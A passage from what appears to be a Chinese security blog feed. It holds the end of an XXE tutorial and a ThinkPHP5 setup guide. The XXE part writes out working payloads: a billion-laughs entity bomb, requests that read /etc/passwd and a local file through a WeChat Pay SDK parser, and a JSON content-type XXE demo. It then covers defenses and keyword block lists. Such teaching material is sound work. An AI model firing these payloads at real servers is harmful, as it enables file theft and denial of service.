&quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt; &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt; &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt; &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt; &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt; &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt; &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt; ]&gt; &lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</code></pre><h2 id="五、真实的-XXE-出现在哪"><a href="#五、真实的-XXE-出现在哪" class="headerlink" title="五、真实的 XXE 出现在哪"></a><strong>五、真实的 XXE 出现在哪</strong></h2><p>我们刚刚说了那么多，都是只是我们对这个漏洞的理解，但是好像还没说这种漏洞出现在什么地方</p><p>如今的 web 时代，是一个前后端分离的时代，有人说 MVC 就是前后端分离，但我觉得这种分离的并不彻底，后端还是要尝试去调用渲染类去控制前端的渲染，我所说的前后端分离是，后端 api 只负责接受约定好要传入的数据，然后经过一系列的黑盒运算，将得到结果以 json 格式返回给前端，前端只负责坐享其成，拿到数据json.decode 就行了（这里的后端可以是后台代码，也可以是外部的api 接口，这里的前端可以是传统意义的前端，也可以是后台代码）</p><p>那么问题经常就出现在 api 接口能解析客户端传过来的 xml 代码，并且直接外部实体的引用，比如下面这个</p><h3 id="实例一：模拟情况"><a href="#实例一：模拟情况" class="headerlink" title="实例一：模拟情况"></a><strong>实例一：模拟情况</strong></h3><p><strong>示例代码：</strong></p><pre><code class="hljs">POST /vulnerable HTTP/1.1Host: www.test.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Referer: https://test.com/test.htmlContent-Type: application/xmlContent-Length: 294Cookie: mycookie=cookies;Connection: closeUpgrade-Insecure-Requests: 1&lt;?xml version=&quot;1.0&quot;?&gt;&lt;catalog&gt;   &lt;core id=&quot;test101&quot;&gt;      &lt;author&gt;John, Doe&lt;/author&gt;      &lt;title&gt;I love XML&lt;/title&gt;      &lt;category&gt;Computers&lt;/category&gt;      &lt;price&gt;9.99&lt;/price&gt;      &lt;date&gt;2018-10-01&lt;/date&gt;      &lt;description&gt;XML is the best!&lt;/description&gt;   &lt;/core&gt;&lt;/catalog&gt;</code></pre><p>我们发出 带有 xml 的 POST 请求以后，述代码将交由服务器的XML处理器解析。代码被解释并返回：{“Request Successful”: “Added!”} </p><p>但是如果我们传入一个恶意的代码</p><pre><code class="hljs">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;catalog&gt;   &lt;core id=&quot;test101&quot;&gt;      &lt;author&gt;John, Doe&lt;/author&gt;      &lt;title&gt;I love XML&lt;/title&gt;      &lt;category&gt;Computers&lt;/category&gt;      &lt;price&gt;9.99&lt;/price&gt;      &lt;date&gt;2018-10-01&lt;/date&gt;      &lt;description&gt;&amp;xxe;&lt;/description&gt;   &lt;/core&gt;&lt;/catalog&gt;</code></pre><p>如果没有做好“安全措施” 就会出现解析恶意代码的情况，就会有下面的返回</p><pre><code class="hljs">&#123;&quot;error&quot;: &quot;no results for description root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/bin/shbin:x:2:2:bin:/bin:/bin/shsys:x:3:3:sys:/dev:/bin/shsync:x:4:65534:sync:/bin:/bin/sync...</code></pre><h3 id="实例二：微信支付的-XXE"><a href="#实例二：微信支付的-XXE" class="headerlink" title="实例二：微信支付的 XXE"></a><strong>实例二：微信支付的 XXE</strong></h3><p>前一阵子非常火的微信支付的 XXE 漏洞当然不得不提，</p><p><strong>漏洞描述：</strong></p><p>微信支付提供了一个 api 接口，供商家接收异步支付结果，微信支付所用的java sdk在处理结果时可能触发一个XXE漏洞，攻击者可以向这个接口发送构造恶意payloads,获取商家服务器上的任何信息，一旦攻击者获得了敏感的数据 (md5-key and merchant-Id etc.)，他可能通过发送伪造的信息不用花钱就购买商家任意物品</p><p>我下载了 java 版本的 sdk 进行分析，这个 sdk 提供了一个 WXPayUtil 工具类，该类中实现了xmltoMap和maptoXml这两个方法，而这次的微信支付的xxe漏洞爆发点就在xmltoMap方法中</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%BE%AE%E4%BF%A1sdk.png" alt="此处输入图片的描述"></p><p>问题就出现在我横线划出来的那部分，也就是简化为下面的代码：</p><pre><code class="hljs">public static Map&lt;String, String&gt; xmlToMap(String strXML) throws Exception &#123;        try &#123;            Map&lt;String, String&gt; data = new HashMap&lt;String, String&gt;();            DocumentBuilder documentBuilder = WXPayXmlUtil.newDocumentBuilder();            InputStream stream = new ByteArrayInputStream(strXML.getBytes(&quot;UTF-8&quot;));            org.w3c.dom.Document doc = documentBuilder.parse(stream);            ...</code></pre><p>我们可以看到 当构建了 documentBuilder 以后就直接对传进来的 strXML  解析了，而不巧的是 strXML 是一处攻击者可控的参数，于是就出现了 XXE 漏洞，下面是我实验的步骤</p><p>首先我在 com 包下又新建了一个包，来写我们的测试代码，测试代码我命名为 test001.java</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%BE%AE%E4%BF%A1sdk%20%E6%B5%8B%E8%AF%951.png" alt="此处输入图片的描述"></p><p><strong>test001.java</strong></p><pre><code class="hljs">package com.test.test001;import java.util.Map;import static com.github.wxpay.sdk.WXPayUtil.xmlToMap;public class test001 &#123;    public static void main(String args[]) throws Exception &#123;        String xmlStr =&quot;&lt;?xml version=&#39;1.0&#39; encoding=&#39;utf-8&#39;?&gt;\r\n&quot; +                &quot;&lt;!DOCTYPE XDSEC [\r\n&quot; +                &quot;&lt;!ENTITY xxe SYSTEM &#39;file:///d:/1.txt&#39;&gt;]&gt;\r\n&quot; +                &quot;&lt;XDSEC&gt;\r\n&quot;+                &quot;&lt;XXE&gt;&amp;xxe;&lt;/XXE&gt;\r\n&quot; +                &quot;&lt;/XDSEC&gt;&quot;;        try&#123;            Map&lt;String,String&gt; test = xmlToMap(xmlStr);            System.out.println(test);        &#125;catch (Exception e)&#123;            e.printStackTrace();        &#125;    &#125;&#125;</code></pre><p>我希望它能读取我 D 盘下面的 1.txt 文件</p><p>运行后成功读取</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%BE%AE%E4%BF%A1sdk%20%E6%B5%8B%E8%AF%952.png" alt="此处输入图片的描述"></p><p>当然，WXPayXmlUtil.java 中有这个 sdk 的配置项，能直接决定实验的效果，当然后期的修复也是针对这里面进行修复的</p><pre><code class="hljs">http://apache.org/xml/features/disallow-doctype-decl truehttp://apache.org/xml/features/nonvalidating/load-external-dtd falsehttp://xml.org/sax/features/external-general-entities falsehttp://xml.org/sax/features/external-parameter-entities false</code></pre><p>整个源码我打包好了已经上传到我的百度云，有兴趣的童鞋可以运行一下感受：</p><blockquote><p>链接：<a href="https://pan.baidu.com/s/1YbCO2cZpzZS1mWd7Mes4Qw">https://pan.baidu.com/s/1YbCO2cZpzZS1mWd7Mes4Qw</a>  提取码：xq1b</p></blockquote><p>上面说过 java 中有一个 netdoc:&#x2F; 协议能代替 file:&#x2F;&#x2F;&#x2F; ,我现在来演示一下：</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/netdoc%20%E5%AE%9E%E4%BE%8B.png" alt="此处输入图片的描述"></p><h3 id="实例三：JSON-content-type-XXE"><a href="#实例三：JSON-content-type-XXE" class="headerlink" title="实例三：JSON content-type XXE"></a><strong>实例三：JSON content-type XXE</strong></h3><p>正如我们所知道的，很多web和移动应用都基于客户端-服务器交互模式的web通信服务。不管是SOAP还是RESTful，一般对于web服务来说，最常见的数据格式都是XML和JSON。尽管web服务可能在编程时只使用其中一种格式，但服务器却可以接受开发人员并没有预料到的其他数据格式，这就有可能会导致JSON节点受到XXE（XML外部实体）攻击</p><h4 id="原始请求和响应："><a href="#原始请求和响应：" class="headerlink" title="原始请求和响应："></a><strong>原始请求和响应：</strong></h4><p><strong>HTTP Request:</strong></p><pre><code class="hljs">POST /netspi HTTP/1.1Host: someserver.netspi.comAccept: application/jsonContent-Type: application/jsonContent-Length: 38 &#123;&quot;search&quot;:&quot;name&quot;,&quot;value&quot;:&quot;netspitest&quot;&#125;</code></pre><p><strong>HTTP Response:</strong></p><pre><code class="hljs">HTTP/1.1 200 OKContent-Type: application/jsonContent-Length: 43 &#123;&quot;error&quot;: &quot;no results for name netspitest&quot;&#125;</code></pre><p>现在我们尝试将 Content-Type 修改为 application&#x2F;xml</p><h4 id="进一步请求和响应："><a href="#进一步请求和响应：" class="headerlink" title="进一步请求和响应："></a><strong>进一步请求和响应：</strong></h4><p><strong>HTTP Request:</strong></p><pre><code class="hljs">POST /netspi HTTP/1.1Host: someserver.netspi.comAccept: application/jsonContent-Type: application/xmlContent-Length: 38 &#123;&quot;search&quot;:&quot;name&quot;,&quot;value&quot;:&quot;netspitest&quot;&#125; </code></pre><p><strong>HTTP Response:</strong></p><pre><code class="hljs">HTTP/1.1 500 Internal Server ErrorContent-Type: application/jsonContent-Length: 127 &#123;&quot;errors&quot;:&#123;&quot;errorMessage&quot;:&quot;org.xml.sax.SAXParseException: XML document structures must start and end within the same entity.&quot;&#125;&#125;</code></pre><p>可以发现服务器端是能处理 xml 数据的，于是我们就可以利用这个来进行攻击</p><h4 id="最终的请求和响应："><a href="#最终的请求和响应：" class="headerlink" title="最终的请求和响应："></a><strong>最终的请求和响应：</strong></h4><p><strong>HTTP Request:</strong></p><pre><code class="hljs">POST /netspi HTTP/1.1Host: someserver.netspi.comAccept: application/jsonContent-Type: application/xmlContent-Length: 288 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;root&gt;&lt;search&gt;name&lt;/search&gt;&lt;value&gt;&amp;xxe;&lt;/value&gt;&lt;/root&gt; </code></pre><p><strong>HTTP Response:</strong></p><pre><code class="hljs">HTTP/1.1 200 OKContent-Type: application/jsonContent-Length: 2467 &#123;&quot;error&quot;: &quot;no results for name root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/bin/shbin:x:2:2:bin:/bin:/bin/shsys:x:3:3:sys:/dev:/bin/shsync:x:4:65534:sync:/bin:/bin/sync....</code></pre><h2 id="六、XXE-如何防御"><a href="#六、XXE-如何防御" class="headerlink" title="六、XXE 如何防御"></a><strong>六、XXE 如何防御</strong></h2><h3 id="方案一：使用语言中推荐的禁用外部实体的方法"><a href="#方案一：使用语言中推荐的禁用外部实体的方法" class="headerlink" title="方案一：使用语言中推荐的禁用外部实体的方法"></a><strong>方案一：使用语言中推荐的禁用外部实体的方法</strong></h3><p><strong>PHP：</strong></p><pre><code class="hljs">libxml_disable_entity_loader(true);</code></pre><p><strong>JAVA:</strong></p><pre><code class="hljs">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;,true);.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;,false).setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;,false);</code></pre><p><strong>Python：</strong></p><pre><code class="hljs">from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</code></pre><h3 id="方案二：手动黑名单过滤-不推荐"><a href="#方案二：手动黑名单过滤-不推荐" class="headerlink" title="方案二：手动黑名单过滤(不推荐)"></a><strong>方案二：手动黑名单过滤(不推荐)</strong></h3><p>过滤关键词：</p><pre><code class="hljs">&lt;!DOCTYPE、&lt;!ENTITY SYSTEM、PUBLIC</code></pre><h2 id="七、总结"><a href="#七、总结" class="headerlink" title="七、总结"></a><strong>七、总结</strong></h2><p>对 XXE 漏洞做了一个重新的认识，对其中一些细节问题做了对应的实战测试，重点在于 netdoc 的利用和 jar 协议的利用，这个 jar 协议的使用很神奇，网上的资料也比较少，我测试也花了很长的时间，希望有真实的案例能出现，利用方式还需要各位大师傅们的努力挖掘。</p><p>你的知识面，决定着你的攻击面。</p><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection">https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection</a><br><a href="http://www.freebuf.com/column/156863.html">http://www.freebuf.com/column/156863.html</a><br><a href="http://www.freebuf.com/vuls/154415.html">http://www.freebuf.com/vuls/154415.html</a><br><a href="https://xz.aliyun.com/t/2426">https://xz.aliyun.com/t/2426</a><br><a href="http://www.freebuf.com/articles/web/177979.html">http://www.freebuf.com/articles/web/177979.html</a><br><a href="http://www.freebuf.com/articles/web/126788.html">http://www.freebuf.com/articles/web/126788.html</a><br><a href="https://www.anquanke.com/post/id/86075">https://www.anquanke.com/post/id/86075</a><br><a href="http://blog.nsfocus.net/xml-dtd-xxe/">http://blog.nsfocus.net/xml-dtd-xxe/</a><br><a href="http://www.freebuf.com/vuls/176837.html">http://www.freebuf.com/vuls/176837.html</a><br><a href="https://xz.aliyun.com/t/2448">https://xz.aliyun.com/t/2448</a><br><a href="http://www.freebuf.com/articles/web/97833.html">http://www.freebuf.com/articles/web/97833.html</a><br><a href="https://xz.aliyun.com/t/2249">https://xz.aliyun.com/t/2249</a><br><a href="https://www.secpulse.com/archives/6256.html">https://www.secpulse.com/archives/6256.html</a><br><a href="https://blog.netspi.com/playing-content-type-xxe-json-endpoints/">https://blog.netspi.com/playing-content-type-xxe-json-endpoints/</a><br><a href="https://xz.aliyun.com/t/122">https://xz.aliyun.com/t/122</a><br><a href="https://shiftordie.de/blog/2017/02/18/smtp-over-xxe/">https://shiftordie.de/blog/2017/02/18/smtp-over-xxe/</a><br><a href="https://blog.csdn.net/u012991692/article/details/80866826">https://blog.csdn.net/u012991692/article/details/80866826</a><br><a href="https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html">https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web安全 漏洞分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ThinkPHP5 的简单搭建和使用</title>
    <link href="/2018/11/14/ThinkPHP5%20%E7%9A%84%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BA/"/>
    <url>/2018/11/14/ThinkPHP5%20%E7%9A%84%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="0X01-Thinkphp-的安装"><a href="#0X01-Thinkphp-的安装" class="headerlink" title="0X01 Thinkphp  的安装"></a><strong>0X01 Thinkphp  的安装</strong></h2><p>我这里选择的是使用 windows 下的 composer 进行安装，收下首先下载 composer 这个工具，安装完成以后进入我们想要创建项目的文件夹输入下面的命令</p><pre><code class="hljs">composer create-project topthink/think tp5 dev-master --prefer-dist</code></pre><p>这样就会在当前目录下形成一个 名为 tp5 的文件夹，这个文件夹中存放的就是 thinkphp5 的基本的框架</p><h2 id="0X02-重点目录结构及文件介绍"><a href="#0X02-重点目录结构及文件介绍" class="headerlink" title="0X02 重点目录结构及文件介绍"></a><strong>0X02 重点目录结构及文件介绍</strong></h2><h3 id="1-目录结构"><a href="#1-目录结构" class="headerlink" title="1.目录结构"></a><strong>1.目录结构</strong></h3><p>application : 应用目录，我们的模型视图控制器都会放在这个文件夹下，这是我们开发的主阵地</p><p>public : 这个是我们项目的入口文件，thinkphp 是一个单一入口的框架</p><p>thinkphp : 框架的核心目录</p><span id="more"></span><h3 id="2-关键文件"><a href="#2-关键文件" class="headerlink" title="2.关键文件"></a><strong>2.关键文件</strong></h3><p>application&#x2F;config.php 项目配置文件，开启 debug 调试模式（在开发中）</p><p>application&#x2F;database.php 数据库配置文件</p><p>public&#x2F;index.php  项目入口文件，定义了应用目录的位置以及包含框架启动文件来启动框架</p><h2 id="0X03-配置虚拟主机"><a href="#0X03-配置虚拟主机" class="headerlink" title="0X03 配置虚拟主机"></a><strong>0X03 配置虚拟主机</strong></h2><p>1.httpd.conf 中判断下面是否被注释，如果被注释请取消注释</p><pre><code class="hljs">(1)Include conf/vhosts.conf(2)LoadModule vhost_alias_module modules/mod_vhost_alias.so</code></pre><p>2.删除 vhost.conf 中原有的默认内容，添加如下内容</p><pre><code class="hljs">&lt;VirtualHost *:80&gt;   DocumentRoot &quot;E:\phpstudy\PHPTutorial\WWW\tp5\public&quot;     ServerName localhost           &lt;Directory &quot;E:\phpstudy\PHPTutorial\WWW\tp5\public&quot;&gt;   Options FollowSymLinks ExecCGI   AllowOverride All   Order allow,deny   Allow from all   Require all granted   &lt;/Directory&gt;&lt;/VirtualHost&gt;</code></pre><p>3.配置 URL 重写</p><p>http.conf 中解开下面的注释</p><pre><code class="hljs">LoadModule rewrite_module modules/mod_rewrite.so</code></pre><p>并在虚拟主机配置中写上</p><pre><code class="hljs">AllowOverride All</code></pre><p>注意：如果使用 phpstudy 的话，官方默认的 .htaccess 是不可以的，需要修改成下面这个样子</p><pre><code class="hljs">&lt;IfModule mod_rewrite.c&gt;  RewriteEngine on  RewriteCond %&#123;REQUEST_FILENAME&#125; !-d  RewriteCond %&#123;REQUEST_FILENAME&#125; !-f  RewriteRule ^(.*)$ index.php [L,E=PATH_INFO:$1]&lt;/IfModule&gt;</code></pre><h2 id="0X04-基本的写法"><a href="#0X04-基本的写法" class="headerlink" title="0X04 基本的写法"></a><strong>0X04 基本的写法</strong></h2><h3 id="1-控制器的基本写法"><a href="#1-控制器的基本写法" class="headerlink" title="1.控制器的基本写法"></a><strong>1.控制器的基本写法</strong></h3><p>(1)模块中的控制器实际上就是一个一个的类，这个类写的时候要继承 Controller  并且要在前面写上命名空间<br>(2) thinkPHP5 使用 return 来返回一个html ，自动渲染到页面上<br>(3)tp5 使用的是 $this-&gt;requrst-&gt;param() 接受参数，当然也要在开始写上命名空间</p><p><strong>示例代码:</strong></p><pre><code class="hljs">&lt;?phpnamespace app\index\controller;use think\Controller;use think\Request;class Index extends Controller&#123;    public function index()    &#123;    print_r($this-&gt;request-&gt;param());        return &#39;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; .think_default_text&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: &quot;Century Gothic&quot;,&quot;Microsoft yahei&quot;; color: #333;font-size:18px&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:)&lt;/h1&gt;&lt;p&gt; ThinkPHP V5&lt;br/&gt;&lt;span style=&quot;font-size:30px&quot;&gt;十年磨一剑 - 为API开发设计的高性能框架&lt;/span&gt;&lt;/p&gt;&lt;span style=&quot;font-size:22px;&quot;&gt;[ V5.0 版本由 &lt;a href=&quot;http://www.qiniu.com&quot; target=&quot;qiniu&quot;&gt;七牛云&lt;/a&gt; 独家赞助发布 ]&lt;/span&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://tajs.qq.com/stats?sId=9347272&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://e.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;think id=&quot;ad_bd568ce7058a1091&quot;&gt;&lt;/think&gt;&#39;;    &#125;&#125;</code></pre><p>我们这样访问</p><pre><code class="hljs">http://localhost/index.php/index/index/index/a/3/b/4/c/5</code></pre><p>结果：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/tp5%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0.png" alt="此处输入图片的描述"></p><h3 id="2-模板和控制器的关系"><a href="#2-模板和控制器的关系" class="headerlink" title="2.模板和控制器的关系"></a><strong>2.模板和控制器的关系</strong></h3><p>每一个模块都有自己的控制器、视图、和模型，访问的时候是按照  index.php&#x2F;模块&#x2F;控制器&#x2F;方法，访问的，然后每一个控制器在 view 中对应着一个同名的文件夹，比如说 controller&#x2F;Index 控制器， view&#x2F;Index 就是这个控制器对应的模板文件夹，那么每一个方法都会在模板文件夹下对应一个同名的 html 文件作为这个方法的模板</p><p>tp5 是通过  </p><pre><code class="hljs">$this-&gt;assign(&#39;data&#39;,$data); </code></pre><p>进行赋值并通过 </p><pre><code class="hljs">return $this-&gt;fetch(&#39;模板名&#39;); </code></pre><p>进行渲染的</p><p><strong>示例代码：</strong></p><p>index&#x2F;controller&#x2F;Index.php</p><pre><code class="hljs">&lt;?phpnamespace app\index\controller;use think\Controller;class Index extends Controller&#123;    public function index()    &#123;    $data = &quot;K0rz3n&quot;;    $this-&gt;assign(&#39;data&#39;,$data);        return $this-&gt;fetch();    &#125;&#125;</code></pre><p>Index&#x2F;view&#x2F;Index&#x2F;index.html</p><pre><code class="hljs">&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;hello &#123;$data&#125;!&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="3-对-SEO-友好的路由"><a href="#3-对-SEO-友好的路由" class="headerlink" title="3.对 SEO 友好的路由"></a><strong>3.对 SEO 友好的路由</strong></h3><p>我们知道，我们的搜索引擎抓取页面最多抓三层，但是我们刚刚写的那种 URL 已经太多层了，这非常不利于搜索引擎的收录，于是 tp5 给我们提供了一种简化的方法，就是 route.php</p><p><strong>示例代码：</strong></p><pre><code class="hljs">return [    &#39;__pattern__&#39; =&gt; [        &#39;name&#39; =&gt; &#39;\w+&#39;,    ],    &#39;[hello]&#39;     =&gt; [        // &#39;:id&#39;   =&gt; [&#39;index/hello&#39;, [&#39;method&#39; =&gt; &#39;get&#39;], [&#39;id&#39; =&gt; &#39;\d+&#39;]],        // &#39;:name&#39; =&gt; [&#39;index/hello&#39;, [&#39;method&#39; =&gt; &#39;post&#39;]],    ],    &#39;hello/[:name]&#39; =&gt; [&#39;index/Index/hello&#39;,[&#39;method&#39; =&gt; &#39;get&#39;,&#39;ext&#39; =&gt; &#39;html&#39;]],];</code></pre><p>这个意思就是我们访问 hello&#x2F;name   就会转给 index&#x2F;Index&#x2F;hello ,并且要求是 Get 方法，后缀名是 HTML</p><p>配置好后我们只要添加这样几个东西就 OK 了</p><pre><code class="hljs"> public function hello($name = &#39;zhangsan&#39;)    &#123;    $this-&gt;assign(&#39;name&#39;,$name);    return $this-&gt;fetch();    &#125;</code></pre><p>hello.html</p><pre><code class="hljs">&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;hello &#123;$name&#125;!&lt;/body&gt;&lt;/html&gt;</code></pre><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/tp5%20%E8%B7%AF%E7%94%B1.png" alt="此处输入图片的描述"></p><p>当然在这种情况下参数名还是会很多斜杠，还是不是很友好，于是我们可以在 config.php 中将默认的斜杠分隔符进行修改，改成其他的这样就避免了这个问题</p><h3 id="4-URL-自动生成"><a href="#4-URL-自动生成" class="headerlink" title="4.URL 自动生成"></a><strong>4.URL 自动生成</strong></h3><p>tp5 给我们提供了 url() 这个函数帮我们自动生成 Url</p><pre><code class="hljs">  public function url()    &#123;    echo url(&#39;url2&#39;,&#39;a=1&amp;b=2&#39;);    &#125;</code></pre><p>这个方法运行的结果就是</p><pre><code class="hljs">/index/index/url2/a/1/b/2.html</code></pre><h3 id="5-请求和响应"><a href="#5-请求和响应" class="headerlink" title="5.请求和响应"></a><strong>5.请求和响应</strong></h3><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/tp5%20%E8%AF%B7%E6%B1%82%E4%B8%8E%E5%93%8D%E5%BA%94.png" alt="此处输入图片的描述"></p><h4 id="1-接收请求的参数"><a href="#1-接收请求的参数" class="headerlink" title="1.接收请求的参数"></a><strong>1.接收请求的参数</strong></h4><p>访问：<a href="http://localhost/index/index/req/username/test">http://localhost/index/index/req/username/test</a></p><p>通过以下代码可以得到 username </p><pre><code class="hljs">echo $this-&gt;request-&gt;param(&#39;username&#39;);</code></pre><p>或者我们可以使用函数助手 input(),下面这段代码能达到和上面一样的效果</p><pre><code class="hljs">echo input(&#39;username&#39;);</code></pre><p>包括我们通过下面的代码获取 url </p><pre><code class="hljs">echo $this-&gt;request-&gt;url();</code></pre><p>这个也有自己的函数助手</p><pre><code class="hljs">echo request()-&gt;url();</code></pre><p>我们可以获分别获取 get post cookie file 等方式的参数</p><pre><code class="hljs">$this-&gt;request-&gt;get()$this-&gt;request-&gt;post()$this-&gt;request-&gt;cookie()$this-&gt;request-&gt;file()</code></pre><p>或者实例化一个 Request 对象,但是这种方法只能接受 url 后面是 &amp; 连接的参数，重写的好像不行</p><pre><code class="hljs">$Request = Request::instance()$request-&gt;get()$Rquest-&gt;post()$Request-&gt;cookie()$Request-&gt;file()</code></pre><h4 id="2-绑定参数"><a href="#2-绑定参数" class="headerlink" title="2.绑定参数"></a><strong>2.绑定参数</strong></h4><pre><code class="hljs">$this-&gt;request-&gt;bind(&#39;user&#39;,&quot;hh&quot;);echo $this-&gt;request-&gt;user;</code></pre><p>那么为什么请求还要动态地绑定参数呢？因为很多时候需要传递 session 的值，来维持会话</p><h4 id="3-返回值"><a href="#3-返回值" class="headerlink" title="3.返回值"></a><strong>3.返回值</strong></h4><p>可以返回多种格式的值 比如  json xml 或者通过 $this-&gt;fetch() 来进行模板渲染</p><pre><code class="hljs">return json($data);return xml($data);</code></pre><p>当然我们的 tp 也有对一些东西的封装，比如实现输出一段话然后进行跳转到某个方法，或者是直接进行重定向</p><pre><code class="hljs">$this-&gt;success(&quot;结果正确&quot;,&#39;hello&#39;);$this-&gt;error(&quot;错误&quot;，&#39;/index/index&#39;)$this-&gt;redirect(&#39;http://www.baidu.com&#39;);</code></pre><h3 id="6-模板与输出"><a href="#6-模板与输出" class="headerlink" title="6.模板与输出"></a><strong>6.模板与输出</strong></h3><p>一般的模板渲染就不想介绍了，这里说下模板布局，其实就是在 view 文件夹下有一个 layout.html 文件，这个文件的内容是这样的</p><p>layout.html</p><pre><code class="hljs">&#123;include file=&quot;/index/header&quot;/&#125;&#123;__CONTENT__&#125;&#123;include file=&quot;/index/footer&quot;/&#125;</code></pre><p>然后我们写模板的时候就在最上面加上对这个文件的引用</p><pre><code class="hljs">&#123;layout name=&quot;layout&quot;/&#125;</code></pre><p>如果我们想全局引入页眉页脚，这个配置需要在 config.php 中进行设置,在模板配置中添加下面的代码</p><pre><code class="hljs">&#39;layout_on&#39; =&gt; &#39;true&#39;,&#39;layout_name&#39; =&gt; &#39;layout&#39;,&#39;layout_item&#39; =&gt; &#39;&#123;__CONTENT__&#125;&#39;,</code></pre><p>这样的话就是进行了全配置但是如果我们有些页面不想这样配置的话我们需要在这样的页面上写上</p><pre><code class="hljs">&#123;__NOLAYOUT__&#125;</code></pre><p>如果我们模板文件中的静态文件路径想要不写死的话，我们可以在 php 文件中的 fecth 前设置字符替换</p><pre><code class="hljs">$this-&gt;view-&gt;replace([&#39;__PUBLIC__&#39; =&gt; &#39;/static&#39;,]);</code></pre><p>如果我们想每个方法都使用这个操作，我们就把上面这段代码放到 控制器的构造函数里面</p><pre><code class="hljs">function __construct()&#123;    parent::__construct();    $this-&gt;view-&gt;replace([&#39;__PUBLIC__&#39; =&gt; &#39;/static&#39;,]);&#125;</code></pre><h2 id="0X05-参考"><a href="#0X05-参考" class="headerlink" title="0X05 参考"></a><strong>0X05 参考</strong></h2><p><a href="https://www.kancloud.cn/thinkphp/thinkphp5-guide/30551">https://www.kancloud.cn/thinkphp/thinkphp5-guide/30551</a></p>]]></content>
    
    
    <categories>
      
      <category>备忘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP 备忘 笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一篇文章带你理解漏洞之 Python 反序列化漏洞</title>
